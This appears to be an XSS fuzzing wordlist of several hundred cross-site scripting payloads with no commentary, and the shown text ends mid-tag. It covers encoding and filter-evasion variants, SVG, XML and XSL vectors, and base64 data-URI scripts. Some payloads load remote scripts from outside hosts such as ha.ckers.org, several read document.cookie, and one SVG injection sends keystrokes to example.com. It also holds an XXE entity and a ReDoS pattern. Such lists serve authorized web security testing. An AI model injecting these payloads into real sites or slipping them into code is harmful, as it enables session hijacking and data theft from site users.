&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
'';!--\"&lt;XSS&gt;=&{()}
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
“><ScRiPt>alert(document.cookie)</script>
“><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
‘; alert(document.cookie); var foo=’
foo\’; alert(document.cookie);//’;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(’XSS’)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<video poster=javascript:alert(1)//></video>
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button><video><source onerror="alert(1)"><video onerror="alert(1)"><source></source></video><form><button formaction="javascript:alert(1)">X</button><body oninput=alert(1)><input autofocus><math href="javascript:alert(1)">CLICKME</math> <math> <!-- up to FF 13 --> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction> <!-- FF 14+ --> <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction> </math><form action="" method="post"> <input name="username" value="admin" /> <input name="password" type="password" value="secret" /> <input name="injected" value="injected" dirname="password" /> <input type="submit"> </form><frameset onload=alert(1)><table background="javascript:alert(1)"></table><!--<img src="--><img src=x onerror=alert(1)//"><comment><img src="</comment><img src=x onerror=alert(1)//"><!-- up to Opera 11.52, FF 3.6.28 --> <![><img src="]><img src=x onerror=alert(1)//"> <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+ --> <svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg><style><img src="</style><img src=x onerror=alert(1)//"><li style=list-style:url() onerror=alert(1)></li> <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed><b <script>alert(1)//</script>0</script></b><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script><!-- IE 6-8 --> <x '="foo"><x foo='><img src=x onerror=alert(1)//'> <!-- IE 6-9 --> <! '="foo"><x foo='><img src=x onerror=alert(2)//'> <? '="foo"><x foo='><img src=x onerror=alert(3)//'><embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF <img src="javascript:alert(2)"> <image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓ <script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div><object allowscriptaccess="always" data="test.swf"></object>class XSS {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1)"),flash.Lib._root.name||"_top"); }}crossdomain: 1[A] <? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>"> [B] <? foo="><x foo='?><script>alert(1)</script>'>"> [C] <! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>"> [D] <% foo><x foo="%><script>alert(1)</script>"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe> <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe><html> <body> <b>some content without two new line \n\n</b> Content-Type: multipart/related; boundary="******"<b>some content without two new line</b> --****** Content-Location: xss.html Content-Transfer-Encoding: base64 PGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1 cmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9 dXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy YW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg --******-- </body> </html><!-- IE 5-9 --> <div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML+='';</script> <!-- IE 10 in IE5-9 Standards mode --> <div id=d><x xmlns='"><iframe onload=alert(2)//'></div> <script>d.innerHTML+='';<img src onerror /" '"= alt=alert(1)//"><title onpropertychange=alert(1)></title><title title=></title><!-- IE 5-8 standards mode --> <a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"> <!-- IE 5-9 standards mode --> <!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"> <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//"><!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(2)//]> --><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10 <script src="\\example.com\foo.js"></script> // Safari 5.0<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object><!-- `<img/src=xx:xx onerror=alert(1)//--!><xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'> <script> x='<%' </script> %>/ alert(2) </script> XXX <style> *['<!--']{} </style> -->{} *{color:red}</style><a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a><style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{back<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d<style>@import "data:,*%7bx:expression(write(1))%7D";</style><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a><style>*[{}@import'test.css?]{color: green;}</style>X* {-o-link:'javascript:alert(1)';-o-link-source: current;}<div style="font-family:'foo[a];color:red;';">XXX</div><div style="font-family:foo}color=red;">XXX</div><div style="[a]color[b]:[c]red">XXX</div><div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div><// style=x:expr<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style><!-- Up to Opera 10.63 --> <div style=content:url(test2.svg)></div> <!-- Up to Opera 11.64 - see link below --> <!-- Up to Opera 12.x --> <div style="background:url(test5.svg)">PRESS ENTER</div><form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)"> <!-- this file can be crossdomain if "action" attribute refers to an external file --> <meta http-equiv="refresh" content="1;URL=test5.svg"/> <input type="submit" autofocus="autofocus"/> </form><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div><div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div><div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>XXX<style> *{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */ <!-- --><!--*{color:red} /* all UA */ *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */ </style>ession\28write(1)\29>ground:red}]{background:green};</style></script><img[a][b]src=x[d]onerror[c]=[e]"alert(1)"><a href="[a]java[b]script[c]:alert(1)">XXX</a<img src="x` `<script>alert(1)</script>"` `>
  <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div><div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style><x style="background:url('x[a];color:red;/*')">XXX</x><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script><script>({0:#0=alert/#0#/#0#(0)})</script><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script><script>history.pushState(0,0,'/i/am/somewhere_else');</script><script src="#">{alert(1)}</script>;1+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);<b><script<b></b><alert(1)</script </b></b><script<{alert(1)}/></script </>0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg><?xml version="1.0" standalone="no"?> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <style type="text/css"> @font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";} </style> </head> <body>Hello</body> </html>

<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg><svg xmlns="http://www.w3.org/2000/svg"> <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:alert(1)"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:alert(1)"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/> </svg><svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="alert(1)"/> <animate attributeName="onunload" to="alert(1)"/> </svg><svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg><svg xmlns="http://www.w3.org/2000/svg" id="foo"> <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/> </svg><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe><svg xmlns="http://www.w3.org/2000/svg"> <a id="x"><rect fill="white" width="1000" height="1000"/></a> <rect fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/> </svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <clipPath id="a" > <set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" /> </clipPath> <pattern id="b"> <set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" /> </pattern> <filter id="c"> <set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" /> </filter> <marker id="d"> <set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(1)" /> </marker> <mask id="e"> <set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(2)" /> </mask> <linearGradient id="f"> <set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(3)" /> </linearGradient> </svg><svg xmlns="http://www.w3.org/2000/svg"> <path d="M0,0" style="marker-start:url(test4.svg#a)"/> </svg>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <marker id="a" markerWidth="1000" markerHeight="1000" refX="0" refY="0"> <a xlink:href="http://google.com"> <set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" /> <rect width="1000" height="1000" fill="white"/> </a> </marker> </svg><?xml version="1.0"?> <?xml-stylesheet type="text/xml" href="#stylesheet"?> <!DOCTYPE doc [ <!ATTLIST xsl:stylesheet id ID #REQUIRED>]> <svg xmlns="http://www.w3.org/2000/svg"> <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe> </xsl:template> </xsl:stylesheet> <circle fill="red" r="40"></circle> </svg><svg xmlns="http://www.w3.org/2000/svg" id="x"> <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/> <handler id="y">alert(1)</handler> </svg><svg><style>&lt;img/src=x onerror=alert(1)// </b><svg> <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'> <!-- Same effect with <image filter='...'> --> </svg><!doctype html> <form> <label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label> <br> <input name="secret" type="password"> </form> <!-- injection --><svg height="50px"> <image xmlns:xlink="http://www.w3.org/1999/xlink"> <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /> <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /> <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /> <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /> </image> </svg><?xml-stylesheet href="javascript:alert(1)"?><root/><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script><?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?> <root/><!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "alert(1)" onload CDATA "alert(2)"> ]><img /><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:alert(1)" xlink:type="simple">XXX</x> </doc><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(1)"/></onevent><timer value="1"/></card><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>

<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;"><?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>

<?xml version="1.0"?> <Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data"> <ElementType name="img"> <AttributeType name="src" required="yes" default="x"/> <AttributeType name="onerror" required="yes" default="alert(1)"/> <attribute type="src"/> <attribute type="onerror"/> </ElementType> </Schema><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?><x:template xmlns:x="http://www.wapforum.org/2001/wml" x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)"><x:timer value="1"/></x:template><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>

<script xmlns="http://www.w3.org/1999/xhtml" id="x">alert(1)</script><?xml-stylesheet type="text/xsl" href="#" ?> <stylesheet xmlns="http://www.w3.org/TR/WD-xsl"> <template match="/"> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if> </template> </stylesheet><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&><meta charset="x-mac-farsi">¼script ¾alert(1)//¼/script ¾<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!><input onblur=focus() autofocus><input>X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe><xml> <rect style="height:100%;width:100%" id="xss" onmouseover="alert(1)" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a><x style="behavior:url(test.sct)"><SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS> <SCRIPT Language="javascript">alert(1)</SCRIPT> </SCRIPTLET><xml id="xss" src="test.htc"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label><?xml version="1.0"?> <x> <payload><![CDATA[<img src=x onerror=alert(1)>]]></payload> </x><event-source src="event.php" onload="alert(1)"><?php header("Content-Type: application/x-dom-event-stream"); die("Event: load\ndata: \n\n"); ?><a href="javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a><div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;"><a href="http://attacker.org"> <iframe src="http://example.org/"></iframe> </a><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"> <h1>Drop me</h1> </div> <iframe src="http://www.example.org/dropHere.html"></iframe><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe> <textarea type="text" cols="50" rows="10"></textarea><script> function makePopups(){ for (i=1;i<6;i++) { window.open('popup.html','spam'+i,'width=50,height=50'); } } </script> <body> <a href="#" onclick="makePopups()">Spam</a><html xmlns="http://www.w3.org/1999/xhtml" xmlns:svg="http://www.w3.org/2000/svg"> <body 